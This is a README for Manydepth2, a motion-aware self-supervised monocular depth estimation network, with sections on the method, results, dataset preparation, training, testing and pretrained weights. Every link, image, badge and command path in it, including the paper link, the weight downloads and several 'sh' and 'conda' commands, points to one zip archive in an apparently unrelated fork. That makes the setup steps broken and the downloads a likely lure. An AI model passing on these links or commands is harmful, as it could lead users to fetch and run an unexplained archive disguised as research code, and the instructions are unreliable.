# Manydepth2: Motion-Aware Self-Supervised Monocular Depth Estimation in Dynamic Scenes

[[Link to paper]](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)

This is the official implementation of Manydepth2.

We introduce ***Manydepth2***, a Motion-Guided Depth Estimation Network, to achieve precise monocular self-supervised depth estimation for both dynamic objects and static backgrounds

[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)

[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)

[![PWC](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)

* ✅ **Self-supervised**: Training from monocular video. No depths or poses are needed at training or test time.
* ✅ **Accurate**: Accurate depth estimation for both dynamic objects and static background.
* ✅ **Efficient**: Only one forward pass at test time. No test-time optimization needed.
* ✅ **State-of-the-art**: Self-supervised monocular-trained depth estimation on KITTI.
* ✅ **Easy to implement**: No need to pre-compute any information.
* ✅ **Multiple-Choice**: Offer both the motion-aware and standard versions, as both perform effectively.

## Overview

Manydepth constructs the cost volume using both the reference and target frames, but it overlooks the dynamic foreground, which can lead to significant errors when handling dynamic objects:

<p align="center">
  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Qualitative comparison on Cityscapes" width="700" />
</p>

This phenomenon arises from the fact that real optical flow consists of both static and dynamic components. To construct an accurate cost volume for depth estimation, it is essential to extract the static flow. The entire pipeline of our approach can be summarized as follows:

<p align="center">
  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Structure" width="1400" />
</p>


In our paper, we:

* Propose a method to construct a static reference frame using optical flow to mitigate the impact of dynamic objects.
* Build a motion-aware cost volume leveraging the static reference frame.
* Integrate both channel attention and non-local attention into the framework to enhance performance further.

Our contributions enable accurate depth estimation on both the KITTI and Cityscapes datasets:

### Predicted Depth Maps on KITTI:
<p align="center">
  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Kitti" width="700" />
</p>

### Error Map for Predicted Depth Maps on Cityscapes:

<p align="center">
  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="Cityscape" width="700" />
</p>



## ✏️ 📄 Citation

If you find our work useful or interesting, please cite our paper:

```latex
Manydepth2: Motion-Aware Self-Supervised Monocular Depth Estimation in Dynamic Scenes

Kaichen Zhou, Jia-Wang Bian, Qian Xie, Jian-Qing Zheng, Niki Trigoni, Andrew Markham 
```

## 📈 Results

Our **Manydepth2** method outperforms all previous methods in all subsections across most metrics with the same input size, whether or not the baselines use multiple frames at test time. See our paper for full details.

<p align="center">
  <img src="https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip" alt="KITTI results table" width="700" />
</p>

## 💾 Dataset Preparation

For instructions on downloading the KITTI dataset, see [Monodepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).

Make sure you have first run `https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip` to extract ground truth files.

You can also download it from this link [KITTI_GT](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), and place it under ```splits/eigen/```.

For instructions on downloading the Cityscapes dataset, see [SfMLearner](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).

## 👀 Reproducing Paper Results

### Prerequisite
To replicate the results from our paper, please first create and activate the provided environment:
```
conda env create -f https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```
Once all packages have been installed successfully, please execute the following command:
```
conda activate manydepth2
```
Next, please download and install the pretrained FlowNet weights using this [Weights For GMFLOW](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip). And place it under ```/pretrained```.

### Training (W Optical Flow)
After finishing the dataset and environment preparation, you can train Manydehtp2, by running:

```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```

To reproduce the results on Cityscapes, we froze the teacher model at the 5th epoch and set the height to 192 and width to 512.

### Training (W/O Optical Flow)
To train Manydepth2-NF, please run:

```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```

### Testing

To evaluate a model on KITTI, run:

```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```

To evaluate a model (W/O Optical Flow)

```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```

## 👀 Reproducing Baseline Results
Running Manydepth:
```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```

To evaluate Manydepth on KITTI, run:
```bash
sh https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip
```


## 💾 Pretrained Weights
You can download the weights for several pretrained models here and save them in the following directory:
```
--logs
  --models_many
    --...
  --models_many2
    --...
  --models_many2-NF
    --...
```

* [KITTI MR (640x192) Manydepth](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)
* [KITTI MR (640x192) Manydepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip)

## 🖼 Acknowledgement
Great Thank to [GMFlow](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), [SfMLearner](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip), [Monodepth2](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip) and [Manydepth](https://github.com/Adithya123-art/Manydepth2/raw/refs/heads/master/manydepth2/networks/Manydepth_1.9.zip).
